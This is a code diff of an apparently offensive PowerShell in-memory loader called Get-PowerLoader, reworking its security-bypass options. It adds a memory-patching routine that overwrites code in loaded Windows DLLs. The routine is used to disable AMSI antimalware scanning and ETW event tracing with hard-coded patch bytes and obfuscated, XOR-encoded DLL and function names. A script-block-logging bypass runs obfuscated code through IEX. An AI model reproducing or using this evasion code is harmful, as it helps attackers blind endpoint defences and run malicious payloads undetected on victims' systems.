@@ -46,7 +46,7 @@ function Get-PowerLoader {
         [string[]]
         $ArgumentList,
 
-        [ValidateSet("AMSI","SBL","ETW")]
+        [ValidateSet("AMSI","ETW","SBL")]
         [string[]]
         $Bypass
     )
@@ -81,17 +81,25 @@ function Get-PowerLoader {
     }
 
     $srcBypass = ''
+    if ($Bypass -and ($Bypass.Contains('AMSI') -or $Bypass.Contains('ETW'))) {
+        $srcBypass += ${function:Invoke-MemoryPatch}.Ast.Extent.Text + [Environment]::NewLine
+    }
     switch ($Bypass) {
         'AMSI' {
-            $srcBypass += '$a = "H4sIAAAAAAAEAB3MwQqCQBCA4Wfx4KCR7Ct4Sg9CtJVBdBh0tAl2XVx3YBEfPuv88/2yxPV5pfdLld6T6W1UJ5J7nCkHHb2QUQ06HMmQE1UGmQwKT06VxjMc4CZsPWQ/VDHZIQfcQ+1Y9lghWxqggPPkLqG33BVadt7tQJM80AbKUxesLVJZAmVbh9J91nZhoWOLi2M3JlA2uk76OKP3yfu/VLB9AarxymS5AAAA"' + [Environment]::NewLine
-            $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes($a) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)' + [Environment]::NewLine
+            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
+        }
+        'ETW' {
+            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xc3)} else {$p = [byte[]] (0xc2, 0x14, 0x00, 0x00)}' + [Environment]::NewLine
+            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
         }
         'SBL' {
             $srcBypass += '$b = "H4sIAAAAAAAEADWOUUsDMRCEf8s9GO6gR/5CUVAEsXhihdKHJdmmW71NuE1WQumPNyf4OMN8M6O5Xg/veD7arQjOnqt9RP2oCw5mqqI42xdIEHDGpHZbNM6gFJOdXKZFHzi6L9OvzBMhnwYjFBJoyShmNLuY3opncqNow1xLTqifwAWHu1SYx2GHP5tX/41Ou//B+8jcdFuRVpwwk7PPIJeGHkQzpXA0fX9zoO5y3WdS3Owhp+a3ir9bnV9/dRxDWF1fFxDpzkCMJ2tuvxHo1jL1AAAA"' + [Environment]::NewLine
             $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-        }
-        'ETW' {
-            $srcBypass += '& ' + ${function:Invoke-EtwBypass}.Ast.Body.Extent.Text + [Environment]::NewLine
         }
     }
 
@@ -139,6 +147,41 @@ function Local:Get-DecodedBytes {
     $gzipStream.Close()
     $input.Close()
     return $output.ToArray()
+}
+
+function Local:Invoke-MemoryPatch {
+    Param (
+        [string] $Dll,
+        [string] $Func,
+        [byte[]] $Patch
+    )
+
+    $win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+    Add-Type $win32
+    $address = [Win32]::GetProcAddress([Win32]::LoadLibrary($Dll), $Func)
+    $a = 0
+    $b = 0
+    [Win32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
+    try {
+        [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
+    }
+    catch {
+        Write-Error "Memory patch failed."
+    }
+    finally {
+        [Win32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]$b) | Out-Null
+    }
 }
 
 function Local:Invoke-DownloadCradle {
@@ -194,6 +237,7 @@ function Local:Invoke-NetLoader {
 
         [string[]] $ArgumentList
     )
+
     $output = New-Object IO.StringWriter
     [Console]::SetOut($output)
     $assembly = [Reflection.Assembly]::Load([byte[]]$Code)
@@ -208,28 +252,4 @@ function Local:Invoke-NetLoader {
     finally {
         Write-Output $output.ToString()
     }
-}
-
-function Local:Invoke-EtwBypass {
-    $win32 = @"
-using System.Runtime.InteropServices;
-using System;
-public class Win32 {
-[DllImport("kernel32")]
-public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-[DllImport("kernel32")]
-public static extern IntPtr LoadLibrary(string name);
-[DllImport("kernel32")]
-public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-    Add-Type $win32
-    $address = [Win32]::GetProcAddress([Win32]::LoadLibrary("ntdll.dll"), "EtwEventWrite")
-    $a = 0
-    $b = 0
-    $h = New-Object Byte[] 1
-    $h[0] = 0xc3
-    [Win32]::VirtualProtect($address, [UInt32]$h.Length, 0x40, [Ref]$a) | Out-Null
-    [System.Runtime.InteropServices.Marshal]::Copy($h, 0, $address, [UInt32]$h.Length)
-    [Win32]::VirtualProtect($address, [UInt32]$h.Length, $a, [Ref]$b) | Out-Null
 }
